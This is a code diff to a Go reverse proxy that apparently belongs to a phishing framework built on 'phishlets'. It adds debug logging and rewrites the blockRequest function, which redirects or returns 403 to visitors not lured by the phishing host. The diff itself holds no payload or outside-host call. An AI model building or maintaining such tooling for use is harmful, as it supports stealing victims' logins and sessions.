@@ -118,6 +118,13 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+	log.Info("hostname: %s", hostname)
+	log.Info("port: %d", port)
+	log.Info("cfg: %v", cfg)
+	log.Info("crt_db: %v", crt_db)
+	log.Info("db: %v", db)
+	log.Info("bl: %v", bl)
+	log.Info("developer: %t", developer)
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -1280,15 +1287,16 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
+/* func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
 	var redirect_url string
 	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
+		log.Info("AUTH URL ")
 		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
 	}
 	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
 		redirect_url = p.cfg.general.UnauthUrl
 	}
-
+	log.Info("REDIRECT URL: %v", redirect_url)
 	if redirect_url != "" {
 		return p.javascriptRedirect(req, redirect_url)
 	} else {
@@ -1296,6 +1304,46 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		if resp != nil {
 			return req, resp
 		}
+	}
+	return req, nil
+} */
+
+func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
+	var redirect_url string
+
+	log.Info("blockRequest: host=%s path=%s ua=%s remote=%s",
+		req.Host, req.URL.Path, req.UserAgent(), req.RemoteAddr)
+
+	pl := p.getPhishletByPhishHost(req.Host)
+	if pl != nil {
+		log.Info("blockRequest: phishlet matched: %s", pl.Name)
+
+		cfg := p.cfg.PhishletConfig(pl.Name)
+		log.Info("blockRequest: phishlet unauth_url=%s", cfg.UnauthUrl)
+
+		redirect_url = cfg.UnauthUrl
+	} else {
+		log.Info("blockRequest: no phishlet matched for host=%s", req.Host)
+	}
+
+	if redirect_url == "" {
+		log.Info("blockRequest: phishlet redirect empty, checking general unauth_url=%s", p.cfg.general.UnauthUrl)
+		if len(p.cfg.general.UnauthUrl) > 0 {
+			redirect_url = p.cfg.general.UnauthUrl
+		}
+	}
+
+	log.Info("blockRequest: final redirect_url=%s", redirect_url)
+
+	if redirect_url != "" {
+		log.Info("blockRequest: redirecting")
+		return p.javascriptRedirect(req, redirect_url)
+	}
+
+	log.Info("blockRequest: returning 403")
+	resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
+	if resp != nil {
+		return req, resp
 	}
 	return req, nil
 }
